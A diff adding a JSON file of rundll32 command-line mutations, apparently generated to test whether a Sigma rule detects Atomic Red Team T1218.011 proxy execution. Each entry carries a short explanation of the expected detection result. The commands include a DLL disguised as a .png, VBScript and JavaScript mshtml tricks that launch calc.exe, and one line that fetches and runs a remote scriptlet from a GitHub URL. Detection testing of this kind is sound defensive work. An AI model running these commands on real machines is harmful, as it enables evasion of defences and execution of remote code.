@@ -1,0 +1,34 @@
+[
+  {
+    "output": "rundll32.exe  C:\\Users\\thaim\\Downloads\\calc.png StartW",
+    "explanation": "This command uses an uncommon file extension (.png) for the DLL argument, which should trigger the Sigma rule. It is a direct mutation of the original test command with minor path normalization."
+  },
+  {
+    "output": "rundll32  vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)",
+    "explanation": "This command uses VBScript to execute rundll32 with an uncommon DLL-like argument, which should trigger the Sigma rule. It is a safe mutation with escaped quotes and preserved functionality."
+  },
+  {
+    "output": "rundll32.exe  C:\\AtomicRedTeam\\atomics\\T1218.011\\bin\\_WT.init,krnl",
+    "explanation": "This command uses an uncommon file extension (.init) for the DLL argument, which should trigger the Sigma rule. It is a direct mutation of the original test command with preserved functionality."
+  },
+  {
+    "output": "rundll32.exe  javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();",
+    "explanation": "This command uses JavaScript to execute rundll32 with an uncommon DLL-like argument, which should trigger the Sigma rule. It is a safe mutation with preserved functionality."
+  },
+  {
+    "output": "\"C:\\Windows\\System32\\RUNDLL32.EXE\" -sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}",
+    "explanation": "This command uses rundll32 with a CLSID instead of a DLL, which should trigger the Sigma rule. It is a direct mutation of the original test command with preserved functionality."
+  },
+  {
+    "output": "\"C:\\WINDOWS\\system32\\rundll32.exe\" keymgr,KRShowKeyMgr",
+    "explanation": "This command uses rundll32 with a known DLL and function, which should not trigger the Sigma rule. It is a direct mutation of the original test command with preserved functionality."
+  },
+  {
+    "output": "rundll32  C:\\Users\\thaim\\Downloads\\calc.png,StartW",
+    "explanation": "This command uses an uncommon file extension (.png) for the DLL argument, which should trigger the Sigma rule. It is a safe mutation with reordering of the function name."
+  },
+  {
+    "output": "rundll32.exe  C:\\Users\\thaim\\Downloads\\calc.png,StartW",
+    "explanation": "This command uses an uncommon file extension (.png) for the DLL argument, which should trigger the Sigma rule. It is a safe mutation with preserved functionality."
+  }
+]
